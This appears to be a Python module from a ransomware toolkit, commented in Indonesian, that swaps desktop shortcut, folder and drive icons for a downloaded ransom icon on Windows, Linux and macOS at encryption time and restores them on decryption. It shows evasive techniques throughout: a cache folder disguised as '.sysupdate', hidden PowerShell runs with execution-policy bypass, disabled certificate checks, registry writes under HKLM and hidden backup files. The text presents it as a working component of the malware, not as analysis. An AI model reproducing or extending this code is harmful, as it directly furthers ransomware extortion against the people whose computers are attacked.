#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Desktop Icon Changer & Restorer — Cross-platform.

Mengubah semua icon desktop menjadi icon ransomware saat encrypt,
dan mengembalikannya saat decrypt.

Support:
  - Windows: .lnk shortcuts, folder icon, drive icon, wallpaper
  - Linux: .desktop files, GNOME/KDE icon theme
  - macOS: extended attributes (xattr), Finder icon

Semua metadata disimpan di file backup (hidden), sehingga restore
bisa dilakukan meskipun payload sudah self-delete.
"""

import os
import sys
import json
import subprocess
import shutil
import tempfile
import time
import platform

# ═══════════════════════════════════════════════════════════════
# DETECT OS
# ═══════════════════════════════════════════════════════════════


def _detect_os():
    s = platform.system().lower()
    if s == "windows":
        return "windows"
    elif s == "darwin":
        return "macos"
    return "linux"


OS = _detect_os()
IS_WINDOWS = OS == "windows"
IS_LINUX = OS == "linux"
IS_MACOS = OS == "macos"


# ═══════════════════════════════════════════════════════════════
# ICON FILE HELPERS
# ═══════════════════════════════════════════════════════════════


def _get_icon_cache_dir():
    """Folder untuk simpan icon ransomware + backup."""
    if IS_WINDOWS:
        base = os.environ.get("TEMP", r"C:\Windows\Temp")
    elif IS_MACOS:
        base = os.path.expanduser("~/Library/Caches")
    else:
        base = os.path.expanduser("~/.cache")
    d = os.path.join(base, ".sysupdate")
    try:
        os.makedirs(d, exist_ok=True)
    except Exception:
        pass
    return d


def _get_backup_path():
    """Path file backup metadata icon."""
    return os.path.join(_get_icon_cache_dir(), "icon_backup.json")


def _download_icon(url):
    """Download icon dari URL ke cache dir. Return local path."""
    try:
        import urllib.request

        cache = _get_icon_cache_dir()

        # Tentukan nama file berdasarkan URL
        ext = ".png"
        if ".ico" in url.lower():
            ext = ".ico"
        elif ".icns" in url.lower():
            ext = ".icns"

        target = os.path.join(cache, "ransom_icon" + ext)

        # Skip kalau sudah ada
        if os.path.exists(target) and os.path.getsize(target) > 1024:
            return target

        print(f"[*] Downloading icon: {url}")
        ctx = None
        try:
            import ssl

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        except Exception:
            pass

        req = urllib.request.Request(
            url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        )
        with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
            data = resp.read()

        if len(data) < 512:
            print(f"[!] Icon too small: {len(data)} bytes")
            return None

        with open(target, "wb") as f:
            f.write(data)

        print(f"[+] Icon saved: {target} ({len(data)} bytes)")
        return target
    except Exception as e:
        print(f"[!] Icon download error: {e}")
        return None


def _convert_to_ico(png_path, ico_path):
    """Convert PNG ke ICO (Windows)."""
    try:
        from PIL import Image

        img = Image.open(png_path)
        # Convert ke RGBA kalau perlu
        if img.mode != "RGBA":
            img = img.convert("RGBA")
        # Resize ke ukuran standar
        img.save(
            ico_path,
            format="ICO",
            sizes=[(256, 256), (128, 128), (64, 64), (48, 48), (32, 32), (16, 16)],
        )
        return True
    except ImportError:
        print("[!] PIL not installed, cannot convert to ICO")
        return False
    except Exception as e:
        print(f"[!] ICO conversion error: {e}")
        return False


# ═══════════════════════════════════════════════════════════════
# WINDOWS IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════

if IS_WINDOWS:
    import ctypes
    import winreg
    from ctypes import wintypes


def _win_get_desktop_paths():
    """Return list Desktop path (user + public)."""
    paths = []

    # User desktop via API
    try:
        FOLDERID_Desktop = ctypes.create_string_buffer(
            b"\x3a\xcc\xbf\xb4"  # B4BFCC3A
            b"\x2c\xdb"  # DB2C
            b"\x4c\x42"  # 424C
            b"\xb0\x29"  # B029
            b"\x7f\xe9\x9a\x87\xc6\x41"  # 7FE99A87C641
        )
        ptr = ctypes.c_wchar_p()
        res = ctypes.windll.shell32.SHGetKnownFolderPath(
            ctypes.byref(FOLDERID_Desktop), 0, None, ctypes.byref(ptr)
        )
        if res == 0:
            paths.append(ptr.value)
            ctypes.windll.ole32.CoTaskMemFree(ptr)
    except Exception:
        pass

    # Fallback USERPROFILE
    up = os.environ.get("USERPROFILE", "")
    if up:
        p = os.path.join(up, "Desktop")
        if os.path.isdir(p) and p not in paths:
            paths.append(p)

    # Public desktop
    pub = os.environ.get("PUBLIC", r"C:\Users\Public")
    p = os.path.join(pub, "Desktop")
    if os.path.isdir(p) and p not in paths:
        paths.append(p)

    return paths


def _win_init_wsh():
    """Init WScript.Shell object."""
    # Coba win32com dulu
    try:
        import win32com.client

        return win32com.client.Dispatch("WScript.Shell")
    except ImportError:
        pass
    # Coba comtypes
    try:
        import comtypes.client

        return comtypes.client.CreateObject("WScript.Shell")
    except Exception:
        pass
    # Fallback: pakai PowerShell per-operasi
    return None


def _win_ps_run(cmd):
    """Run PowerShell command (hidden)."""
    try:
        subprocess.run(
            [
                "powershell",
                "-NoProfile",
                "-WindowStyle",
                "Hidden",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                cmd,
            ],
            capture_output=True,
            timeout=15,
            creationflags=0x08000000,
        )
        return True
    except Exception:
        return False


def _win_backup_lnk(desktop_paths):
    """Backup .lnk icon location."""
    backup = {}
    wsh = _win_init_wsh()

    for desktop in desktop_paths:
        if not os.path.isdir(desktop):
            continue
        try:
            for fname in os.listdir(desktop):
                if not fname.lower().endswith(".lnk"):
                    continue
                lnk_path = os.path.join(desktop, fname)
                try:
                    if wsh:
                        link = wsh.CreateShortcut(lnk_path)
                        backup[lnk_path] = {
                            "icon_location": link.IconLocation,
                            "target": link.TargetPath,
                            "args": link.Arguments,
                            "working_dir": link.WorkingDirectory,
                        }
                    else:
                        # Fallback PowerShell
                        ps_cmd = (
                            f"$sh = New-Object -ComObject WScript.Shell; "
                            f'$lnk = $sh.CreateShortcut("{lnk_path}"); '
                            f"Write-Output $lnk.IconLocation"
                        )
                        r = subprocess.run(
                            ["powershell", "-NoProfile", "-Command", ps_cmd],
                            capture_output=True,
                            text=True,
                            timeout=10,
                            creationflags=0x08000000,
                        )
                        backup[lnk_path] = {
                            "icon_location": r.stdout.strip(),
                        }
                except Exception:
                    pass
        except Exception:
            pass

    return backup


def _win_replace_lnk(desktop_paths, icon_path):
    """Replace .lnk icon."""
    wsh = _win_init_wsh()
    replaced = 0

    for desktop in desktop_paths:
        if not os.path.isdir(desktop):
            continue
        try:
            for fname in os.listdir(desktop):
                if not fname.lower().endswith(".lnk"):
                    continue
                lnk_path = os.path.join(desktop, fname)
                try:
                    if wsh:
                        link = wsh.CreateShortcut(lnk_path)
                        link.IconLocation = f"{icon_path},0"
                        link.Save()
                        replaced += 1
                    else:
                        ps_cmd = (
                            f"$sh = New-Object -ComObject WScript.Shell; "
                            f'$lnk = $sh.CreateShortcut("{lnk_path}"); '
                            f'$lnk.IconLocation = "{icon_path},0"; '
                            f"$lnk.Save()"
                        )
                        _win_ps_run(ps_cmd)
                        replaced += 1
                except Exception:
                    pass
        except Exception:
            pass

    return replaced


def _win_restore_lnk(backup_lnks):
    """Restore .lnk icon."""
    wsh = _win_init_wsh()
    restored = 0

    for lnk_path, info in backup_lnks.items():
        if not os.path.exists(lnk_path):
            continue
        icon_loc = info.get("icon_location", "")
        if not icon_loc:
            continue
        try:
            if wsh:
                link = wsh.CreateShortcut(lnk_path)
                link.IconLocation = icon_loc
                link.Save()
                restored += 1
            else:
                ps_cmd = (
                    f"$sh = New-Object -ComObject WScript.Shell; "
                    f'$lnk = $sh.CreateShortcut("{lnk_path}"); '
                    f'$lnk.IconLocation = "{icon_loc}"; '
                    f"$lnk.Save()"
                )
                _win_ps_run(ps_cmd)
                restored += 1
        except Exception:
            pass

    return restored


def _win_backup_folder_icons():
    """Backup desktop.ini folder icons."""
    backup = {}
    user_profile = os.environ.get("USERPROFILE", "")
    folders = [
        "Desktop",
        "Documents",
        "Downloads",
        "Pictures",
        "Videos",
        "Music",
        "Favorites",
    ]

    for fn in folders:
        folder = os.path.join(user_profile, fn)
        if not os.path.isdir(folder):
            continue
        ini = os.path.join(folder, "desktop.ini")
        if os.path.exists(ini):
            try:
                with open(ini, "r", encoding="utf-8", errors="ignore") as f:
                    backup[folder] = f.read()
            except Exception:
                pass

    return backup


def _win_set_folder_icon(folder, icon_path):
    """Set folder icon via desktop.ini."""
    ini = os.path.join(folder, "desktop.ini")
    try:
        # Clear attribute
        if os.path.exists(ini):
            subprocess.run(
                ["attrib", "-r", "-s", "-h", ini],
                capture_output=True,
                timeout=5,
                creationflags=0x08000000,
            )

        content = (
            "[.ShellClassInfo]\r\n"
            f"IconResource={icon_path},0\r\n"
            "ConfirmFileOp=0\r\n"
        )
        with open(ini, "w", encoding="utf-8", newline="\r\n") as f:
            f.write(content)

        subprocess.run(
            ["attrib", "+s", "+h", ini],
            capture_output=True,
            timeout=5,
            creationflags=0x08000000,
        )
        subprocess.run(
            ["attrib", "+r", folder],
            capture_output=True,
            timeout=5,
            creationflags=0x08000000,
        )
        return True
    except Exception:
        return False


def _win_restore_folder_icons(backup):
    """Restore desktop.ini."""
    restored = 0
    for folder, content in backup.items():
        if not os.path.isdir(folder):
            continue
        ini = os.path.join(folder, "desktop.ini")
        try:
            if os.path.exists(ini):
                subprocess.run(
                    ["attrib", "-r", "-s", "-h", ini],
                    capture_output=True,
                    timeout=5,
                    creationflags=0x08000000,
                )
            with open(ini, "w", encoding="utf-8", newline="\r\n") as f:
                f.write(content)
            subprocess.run(
                ["attrib", "+s", "+h", ini],
                capture_output=True,
                timeout=5,
                creationflags=0x08000000,
            )
            subprocess.run(
                ["attrib", "+r", folder],
                capture_output=True,
                timeout=5,
                creationflags=0x08000000,
            )
            restored += 1
        except Exception:
            pass
    return restored


def _win_backup_drive_icons():
    """Backup drive icons dari registry."""
    backup = {}
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\DriveIcons"
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ
        ) as key:
            i = 0
            while True:
                try:
                    drive = winreg.EnumKey(key, i)
                    i += 1
                    drive_backup = {}
                    with winreg.OpenKey(key, drive, 0, winreg.KEY_READ) as dk:
                        j = 0
                        while True:
                            try:
                                subkey = winreg.EnumKey(dk, j)
                                j += 1
                                with winreg.OpenKey(
                                    dk, subkey, 0, winreg.KEY_READ
                                ) as sk:
                                    try:
                                        default, _ = winreg.QueryValueEx(sk, "")
                                        drive_backup[subkey] = default
                                    except FileNotFoundError:
                                        pass
                            except OSError:
                                break
                    backup[drive] = drive_backup
                except OSError:
                    break
    except FileNotFoundError:
        pass
    except Exception:
        pass
    return backup


def _win_set_drive_icons(icon_path):
    """Set icon untuk semua drive."""
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\DriveIcons"
        for letter in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            drive = f"{letter}:"
            try:
                with winreg.CreateKeyEx(
                    winreg.HKEY_LOCAL_MACHINE,
                    f"{key_path}\\{drive}\\DefaultIcon",
                    0,
                    winreg.KEY_WRITE,
                ) as key:
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f"{icon_path},0")
            except Exception:
                pass
        return True
    except Exception:
        return False


def _win_restore_drive_icons(backup):
    """Restore drive icons."""
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\DriveIcons"
    for drive, subkeys in backup.items():
        for subkey, value in subkeys.items():
            try:
                with winreg.CreateKeyEx(
                    winreg.HKEY_LOCAL_MACHINE,
                    f"{key_path}\\{drive}\\{subkey}",
                    0,
                    winreg.KEY_WRITE,
                ) as key:
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, value)
            except Exception:
                pass


def _win_refresh_explorer():
    """Restart explorer untuk apply icon."""
    try:
        subprocess.run(
            ["ie4uinit.exe", "-show"],
            capture_output=True,
            timeout=5,
            creationflags=0x08000000,
        )
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# LINUX IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════


def _linux_get_desktop_paths():
    """Return list Desktop path di Linux."""
    paths = []
    home = os.path.expanduser("~")

    # XDG user dir
    try:
        r = subprocess.run(
            ["xdg-user-dir", "DESKTOP"], capture_output=True, text=True, timeout=3
        )
        if r.returncode == 0 and r.stdout.strip():
            d = r.stdout.strip()
            if d and os.path.isdir(d):
                paths.append(d)
    except Exception:
        pass

    # Fallback multi-bahasa
    for name in [
        "Desktop",
        "Área de Trabalho",
        "Bureau",
        "Schreibtisch",
        "Scrivania",
        "Escritorio",
        "Рабочий стол",
        "桌面",
        "デスクトップ",
        "바탕 화면",
    ]:
        p = os.path.join(home, name)
        if os.path.isdir(p) and p not in paths:
            paths.append(p)

    return paths


def _linux_backup_desktop_files():
    """Backup semua .desktop files di Desktop + applications."""
    backup = {}

    # Desktop
    for desktop in _linux_get_desktop_paths():
        if not os.path.isdir(desktop):
            continue
        try:
            for fname in os.listdir(desktop):
                if not fname.endswith(".desktop"):
                    continue
                fpath = os.path.join(desktop, fname)
                try:
                    with open(fpath, "r", encoding="utf-8") as f:
                        backup[fpath] = f.read()
                except Exception:
                    pass
        except Exception:
            pass

    # Applications
    app_dir = os.path.expanduser("~/.local/share/applications")
    if os.path.isdir(app_dir):
        try:
            for fname in os.listdir(app_dir):
                if not fname.endswith(".desktop"):
                    continue
                fpath = os.path.join(app_dir, fname)
                try:
                    with open(fpath, "r", encoding="utf-8") as f:
                        backup[fpath] = f.read()
                except Exception:
                    pass
        except Exception:
            pass

    return backup


def _linux_replace_desktop_files(icon_path):
    """Replace Icon= di semua .desktop files."""
    import re

    replaced = 0

    targets = []
    for desktop in _linux_get_desktop_paths():
        if os.path.isdir(desktop):
            targets.append(desktop)

    app_dir = os.path.expanduser("~/.local/share/applications")
    if os.path.isdir(app_dir):
        targets.append(app_dir)

    for target_dir in targets:
        try:
            for fname in os.listdir(target_dir):
                if not fname.endswith(".desktop"):
                    continue
                fpath = os.path.join(target_dir, fname)
                try:
                    with open(fpath, "r", encoding="utf-8") as f:
                        content = f.read()

                    if re.search(r"^Icon=", content, re.MULTILINE):
                        content = re.sub(
                            r"^Icon=.*$",
                            f"Icon={icon_path}",
                            content,
                            flags=re.MULTILINE,
                        )
                    else:
                        content += f"\nIcon={icon_path}\n"

                    with open(fpath, "w", encoding="utf-8") as f:
                        f.write(content)
                    try:
                        os.chmod(fpath, 0o755)
                    except Exception:
                        pass
                    replaced += 1
                except Exception:
                    pass
        except Exception:
            pass

    return replaced


def _linux_restore_desktop_files(backup):
    """Restore .desktop files dari backup."""
    restored = 0
    for fpath, content in backup.items():
        try:
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(content)
            try:
                os.chmod(fpath, 0o755)
            except Exception:
                pass
            restored += 1
        except Exception:
            pass
    return restored


def _linux_backup_theme():
    """Backup icon theme."""
    backup = {}
    try:
        r = subprocess.run(
            ["gsettings", "get", "org.gnome.desktop.interface", "icon-theme"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        if r.returncode == 0:
            backup["gnome_icon_theme"] = r.stdout.strip()
    except Exception:
        pass
    return backup


def _linux_restore_theme(backup):
    """Restore icon theme."""
    if "gnome_icon_theme" in backup:
        try:
            theme = backup["gnome_icon_theme"].strip().strip("'\"")
            subprocess.run(
                [
                    "gsettings",
                    "set",
                    "org.gnome.desktop.interface",
                    "icon-theme",
                    theme,
                ],
                capture_output=True,
                timeout=5,
            )
        except Exception:
            pass


def _linux_refresh_desktop():
    """Refresh desktop environment."""
    try:
        subprocess.run(["nautilus", "-q"], capture_output=True, timeout=5)
    except Exception:
        pass
    try:
        subprocess.run(
            [
                "update-desktop-database",
                os.path.expanduser("~/.local/share/applications"),
            ],
            capture_output=True,
            timeout=5,
        )
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# MACOS IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════


def _mac_get_desktop_paths():
    """Return list Desktop path di macOS."""
    paths = []
    home = os.path.expanduser("~")
    p = os.path.join(home, "Desktop")
    if os.path.isdir(p):
        paths.append(p)
    return paths


def _mac_backup_xattr():
    """Backup extended attribute icon."""
    backup = {}
    for desktop in _mac_get_desktop_paths():
        if not os.path.isdir(desktop):
            continue
        try:
            for fname in os.listdir(desktop):
                fpath = os.path.join(desktop, fname)
                if not os.path.exists(fpath):
                    continue
                try:
                    r = subprocess.run(
                        ["xattr", "-l", fpath],
                        capture_output=True,
                        text=True,
                        timeout=5,
                    )
                    if (
                        "com.apple.FinderInfo" in r.stdout
                        or "com.apple.ResourceFork" in r.stdout
                    ):
                        info = {}
                        for attr in ["com.apple.FinderInfo", "com.apple.ResourceFork"]:
                            try:
                                r2 = subprocess.run(
                                    ["xattr", "-px", attr, fpath],
                                    capture_output=True,
                                    text=True,
                                    timeout=5,
                                )
                                if r2.returncode == 0:
                                    info[attr] = r2.stdout.strip()
                            except Exception:
                                pass
                        if info:
                            backup[fpath] = info
                except Exception:
                    pass
        except Exception:
            pass
    return backup


def _mac_set_icon(file_path, icon_path):
    """Set custom icon untuk file di macOS."""
    # Method 1: fileicon (kalau ada)
    if shutil.which("fileicon"):
        try:
            r = subprocess.run(
                ["fileicon", "set", file_path, icon_path],
                capture_output=True,
                timeout=10,
            )
            if r.returncode == 0:
                return True
        except Exception:
            pass

    # Method 2: Rez + SetFile + DeRez
    if shutil.which("Rez") and shutil.which("SetFile"):
        try:
            # Buat ResourceFork dari PNG
            temp_rsrc = os.path.join(tempfile.gettempdir(), "icon.rsrc")
            subprocess.run(
                [
                    "sips",
                    "-s",
                    "format",
                    "png",
                    icon_path,
                    "--out",
                    "/tmp/_icon_tmp.png",
                ],
                capture_output=True,
                timeout=10,
            )
            # Gunakan Rez script
            rez_script = f"""
data 'icns' (0) {{
    $"..."  /* placeholder — butuh konversi ICNS */
}};
"""
            # Skip: kompleks, biasanya butuh script tambahan
            return False
        except Exception:
            pass

    return False


def _mac_restore_xattr(backup):
    """Restore extended attributes."""
    restored = 0
    for fpath, info in backup.items():
        if not os.path.exists(fpath):
            continue
        for attr, hex_value in info.items():
            try:
                subprocess.run(
                    ["xattr", "-wx", attr, hex_value, fpath],
                    capture_output=True,
                    timeout=5,
                )
                restored += 1
            except Exception:
                pass
    return restored


def _mac_refresh_finder():
    """Restart Finder untuk apply."""
    try:
        subprocess.run(["killall", "Finder"], capture_output=True, timeout=5)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# PUBLIC API — ENCRYPT SIDE
# ═══════════════════════════════════════════════════════════════


def change_desktop_icons(icon_url=None, icon_path=None):
    """
    Ganti semua icon desktop sesuai OS.

    Args:
        icon_url: URL untuk download icon (opsional)
        icon_path: Local path icon (opsional, kalau sudah ada file)

    Returns:
        dict: {
            "success": bool,
            "backup_path": str,
            "replaced_count": int,
            "os": str,
            "error": str (opsional),
        }
    """
    result = {
        "success": False,
        "backup_path": None,
        "replaced_count": 0,
        "os": OS,
    }

    try:
        # ─── Dapatkan icon file ───
        final_icon = None

        if icon_path and os.path.exists(icon_path):
            final_icon = icon_path
        elif icon_url:
            final_icon = _download_icon(icon_url)
        else:
            # Coba pakai icon default dari cache
            cache = _get_icon_cache_dir()
            for ext in [".ico", ".png", ".icns"]:
                candidate = os.path.join(cache, "ransom_icon" + ext)
                if os.path.exists(candidate):
                    final_icon = candidate
                    break

        if not final_icon:
            result["error"] = "No icon available"
            print("[!] No icon available")
            return result

        # ─── Windows: konversi ke .ico kalau perlu ───
        if IS_WINDOWS:
            if not final_icon.lower().endswith(".ico"):
                ico_path = os.path.join(_get_icon_cache_dir(), "ransom_icon.ico")
                if _convert_to_ico(final_icon, ico_path):
                    final_icon = ico_path

        # ════════════════ WINDOWS ════════════════
        if IS_WINDOWS:
            desktop_paths = _win_get_desktop_paths()

            backup = {
                "os": "windows",
                "lnk_icons": _win_backup_lnk(desktop_paths),
                "folder_icons": _win_backup_folder_icons(),
                "drive_icons": _win_backup_drive_icons(),
            }

            replaced = _win_replace_lnk(desktop_paths, final_icon)

            # Folder icons
            for fn in ["Desktop", "Documents", "Downloads", "Pictures"]:
                folder = os.path.join(os.environ.get("USERPROFILE", ""), fn)
                if os.path.isdir(folder):
                    _win_set_folder_icon(folder, final_icon)

            # Drive icons (butuh admin)
            _win_set_drive_icons(final_icon)

            # Save backup
            backup_path = _get_backup_path()
            with open(backup_path, "w", encoding="utf-8") as f:
                json.dump(backup, f, indent=2)

            # Hide backup
            try:
                subprocess.run(
                    ["attrib", "+h", "+s", backup_path],
                    capture_output=True,
                    timeout=5,
                    creationflags=0x08000000,
                )
            except Exception:
                pass

            _win_refresh_explorer()

            result["success"] = True
            result["backup_path"] = backup_path
            result["replaced_count"] = replaced
            print(f"[+] Windows: {replaced} icons replaced")

        # ════════════════ LINUX ════════════════
        elif IS_LINUX:
            backup = {
                "os": "linux",
                "desktop_files": _linux_backup_desktop_files(),
                "theme": _linux_backup_theme(),
            }

            replaced = _linux_replace_desktop_files(final_icon)

            backup_path = _get_backup_path()
            with open(backup_path, "w", encoding="utf-8") as f:
                json.dump(backup, f, indent=2)
            try:
                os.chmod(backup_path, 0o600)
            except Exception:
                pass

            _linux_refresh_desktop()

            result["success"] = True
            result["backup_path"] = backup_path
            result["replaced_count"] = replaced
            print(f"[+] Linux: {replaced} icons replaced")

        # ════════════════ MACOS ════════════════
        elif IS_MACOS:
            backup = {
                "os": "macos",
                "icons": _mac_backup_xattr(),
            }

            replaced = 0
            for desktop in _mac_get_desktop_paths():
                for fname in os.listdir(desktop):
                    fpath = os.path.join(desktop, fname)
                    if _mac_set_icon(fpath, final_icon):
                        replaced += 1

            backup_path = _get_backup_path()
            with open(backup_path, "w", encoding="utf-8") as f:
                json.dump(backup, f, indent=2)
            try:
                os.chmod(backup_path, 0o600)
            except Exception:
                pass

            _mac_refresh_finder()

            result["success"] = True
            result["backup_path"] = backup_path
            result["replaced_count"] = replaced
            print(f"[+] macOS: {replaced} icons replaced")

        else:
            result["error"] = f"Unsupported OS: {OS}"

    except Exception as e:
        import traceback

        result["error"] = str(e)
        print(f"[!] change_desktop_icons error: {e}")
        print(traceback.format_exc())

    return result


# ═══════════════════════════════════════════════════════════════
# PUBLIC API — DECRYPT SIDE
# ═══════════════════════════════════════════════════════════════


def restore_desktop_icons(backup_path=None):
    """
    Restore semua icon desktop dari backup.

    Args:
        backup_path: Path ke backup file (opsional, auto-detect)

    Returns:
        dict: {
            "success": bool,
            "restored_count": int,
            "os": str,
            "error": str (opsional),
        }
    """
    result = {
        "success": False,
        "restored_count": 0,
        "os": OS,
    }

    try:
        # Auto-detect backup path
        if not backup_path:
            backup_path = _get_backup_path()

        if not os.path.exists(backup_path):
            result["error"] = f"Backup not found: {backup_path}"
            print(f"[!] Backup not found: {backup_path}")
            return result

        with open(backup_path, "r", encoding="utf-8") as f:
            backup = json.load(f)

        backup_os = backup.get("os", "")

        # ════════════════ WINDOWS ════════════════
        if backup_os == "windows" or IS_WINDOWS:
            restored = 0
            restored += _win_restore_lnk(backup.get("lnk_icons", {}))
            restored += _win_restore_folder_icons(backup.get("folder_icons", {}))
            _win_restore_drive_icons(backup.get("drive_icons", {}))

            _win_refresh_explorer()

            result["success"] = True
            result["restored_count"] = restored
            print(f"[+] Windows: {restored} icons restored")

        # ════════════════ LINUX ════════════════
        elif backup_os == "linux" or IS_LINUX:
            restored = _linux_restore_desktop_files(backup.get("desktop_files", {}))
            _linux_restore_theme(backup.get("theme", {}))

            _linux_refresh_desktop()

            result["success"] = True
            result["restored_count"] = restored
            print(f"[+] Linux: {restored} icons restored")

        # ════════════════ MACOS ════════════════
        elif backup_os == "macos" or IS_MACOS:
            restored = _mac_restore_xattr(backup.get("icons", {}))

            _mac_refresh_finder()

            result["success"] = True
            result["restored_count"] = restored
            print(f"[+] macOS: {restored} icons restored")

        else:
            result["error"] = f"Unknown backup OS: {backup_os}"

        # Hapus backup setelah restore berhasil
        if result["success"]:
            try:
                os.remove(backup_path)
            except Exception:
                pass

    except Exception as e:
        import traceback

        result["error"] = str(e)
        print(f"[!] restore_desktop_icons error: {e}")
        print(traceback.format_exc())

    return result


# ═══════════════════════════════════════════════════════════════
# UTILITY
# ═══════════════════════════════════════════════════════════════


def is_backup_exists():
    """Cek apakah backup file ada."""
    return os.path.exists(_get_backup_path())


def cleanup_backup():
    """Hapus backup file (tanpa restore)."""
    try:
        if os.path.exists(_get_backup_path()):
            os.remove(_get_backup_path())
        return True
    except Exception:
        return False
